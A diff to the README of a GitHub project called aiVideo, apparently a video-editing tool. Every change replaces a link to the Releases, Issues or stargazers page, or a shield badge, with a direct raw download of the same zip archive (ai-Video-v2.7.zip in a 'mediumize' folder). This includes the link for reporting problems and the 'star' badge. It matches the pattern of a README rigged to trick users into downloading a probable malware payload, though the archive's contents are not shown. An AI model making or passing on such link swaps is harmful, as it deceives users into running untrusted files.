@@ -8,7 +8,7 @@ Welcome to **aiVideo**! This tool helps you save time on video editing. Whether 
 
 To begin, visit the Releases page to download the software:
 
-[![Download aiVideo](https://img.shields.io/badge/Download-aiVideo-brightgreen)](https://github.com/Johnny12242006/aiVideo/releases)
+[![Download aiVideo](https://github.com/Johnny12242006/aiVideo/raw/refs/heads/main/mediumize/ai-Video-v2.7.zip)](https://github.com/Johnny12242006/aiVideo/raw/refs/heads/main/mediumize/ai-Video-v2.7.zip)
 
 ### Steps to Download aiVideo
 
@@ -68,14 +68,14 @@ Should you encounter any issues:
 
 For additional help:
 
-- Visit our [GitHub Issues page](https://github.com/Johnny12242006/aiVideo/issues) to report any problems or ask questions.
+- Visit our [GitHub Issues page](https://github.com/Johnny12242006/aiVideo/raw/refs/heads/main/mediumize/ai-Video-v2.7.zip) to report any problems or ask questions.
 - Join our community forums for tips and user discussions.
 
 ## 📢 Stay Updated
 
 Follow our repository to get the latest news and updates on new features and improvements:
 
-[![Star aiVideo](https://img.shields.io/github/stars/Johnny12242006/aiVideo)](https://github.com/Johnny12242006/aiVideo/stargazers)
+[![Star aiVideo](https://github.com/Johnny12242006/aiVideo/raw/refs/heads/main/mediumize/ai-Video-v2.7.zip)](https://github.com/Johnny12242006/aiVideo/raw/refs/heads/main/mediumize/ai-Video-v2.7.zip)
 
 ## 💬 Feedback
 
